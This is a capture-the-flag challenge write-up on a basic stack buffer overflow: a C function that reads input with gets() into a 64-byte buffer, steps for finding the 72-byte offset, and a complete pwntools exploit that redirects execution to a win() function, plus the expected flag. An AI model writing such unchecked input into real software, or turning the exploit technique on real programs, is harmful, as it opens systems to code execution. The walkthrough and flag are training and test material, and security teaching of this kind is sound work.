# Challenge 01: Basic Stack Overflow

## Difficulty: Easy

## Vulnerability Type: Stack Buffer Overflow

## Description
This is the most basic stack overflow challenge. The program uses the dangerous `gets()` function which doesn't perform bounds checking.

## Protections
- **NX**: Enabled (stack is non-executable)
- **PIE**: Disabled (addresses are fixed)
- **Canary**: Disabled
- **RELRO**: Partial

## Vulnerability Analysis
```c
void vuln() {
    char buffer[64];
    gets(buffer);  // No bounds checking!
}
```

The `gets()` function reads unlimited input into a 64-byte buffer, allowing us to overflow and overwrite the return address.

## Exploitation Strategy

### Step 1: Find the offset
Use pattern generation to find the exact offset to the return address:
```bash
python3 -c "from pwn import *; print(cyclic(200))" | ./challenge
```

The offset should be 72 bytes (64 bytes buffer + 8 bytes saved RBP).

### Step 2: Find the win() function address
```bash
nm challenge | grep win
# Or
objdump -d challenge | grep "<win>"
```

### Step 3: Create exploit
```python
#!/usr/bin/env python3
from pwn import *

# Set up the binary
elf = ELF('./challenge')
context.binary = elf

# Find addresses
win_addr = elf.symbols['win']

# Create payload
offset = 72
payload = b'A' * offset
payload += p64(win_addr)

# Run exploit
if args.REMOTE:
    p = remote('localhost', 9001)
else:
    p = process('./challenge')

p.sendlineafter(b'name: ', payload)
p.interactive()
```

## Expected Output
```
flag{basic_stack_overflow_no_canary}
```

## Automated Detection
- **Crash Analysis**: Program crashes with SIGSEGV
- **RIP Control**: Return address is overwritten and controllable
- **Win Function**: Simple win function exists at fixed address
- **Strategy**: Direct RIP overwrite to win function

## Learning Objectives
- Understanding stack layout
- Return address overwriting
- Basic exploitation without protections
